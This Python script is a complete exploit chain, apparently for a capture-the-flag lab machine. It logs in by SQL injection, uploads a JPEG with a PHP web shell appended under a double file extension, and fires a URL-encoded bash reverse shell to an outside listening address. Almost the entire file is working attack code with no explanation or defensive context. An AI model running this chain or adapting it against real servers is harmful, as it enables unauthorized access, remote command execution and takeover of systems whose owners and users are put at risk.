#!/bin/python3

import requests
import threading
import signal
import time
import sys


def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Proxies for troubleshooting
proxies = {
    "http": "http://127.0.0.1:8080",
}

s = requests.Session()
s.proxies.update(proxies)


# def foothold():
"""
POST SQL Injection on login.php
"""
login_url = "http://10.10.10.185/login.php"
login_parameters = {"username": "' or 1=1-- -", "password": ""}
s.post(login_url, data=login_parameters, allow_redirects=True)
# print(post_sqli.text)
print("[+] Logged in!")

"""
Upload jpeg with rce code
"""
upload_url = "http://10.10.10.185/upload.php"
# os.system(echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>' >> rce.jpg)
# read in binary mode

"""
Content-Disposition: form-data; name="image"; filename="rce.php.jpg"
Content-Type: image/jpeg
Content-Disposition: form-data; name="submit"
Upload Image
"""
# Download a valid JPEG image and execute this command in your terminal:
# echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>' >> rce.jpg
upload_image = {
    "image": ("rce.php.jpg", open("rce.jpg", "rb"), "image/jpeg"),
    "submit": (None, "Upload Image"),
}

s.post(
    upload_url,
    files=upload_image,
)

print("[+] Uploaded the file")

# Reverse Shell (Change the IP and PORT of the payload)
rce_url = "http://10.10.10.185/images/uploads/rce.php.jpg"
payload = "?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.41%2F1234%200%3E%261%27"
requests.get(rce_url + payload)
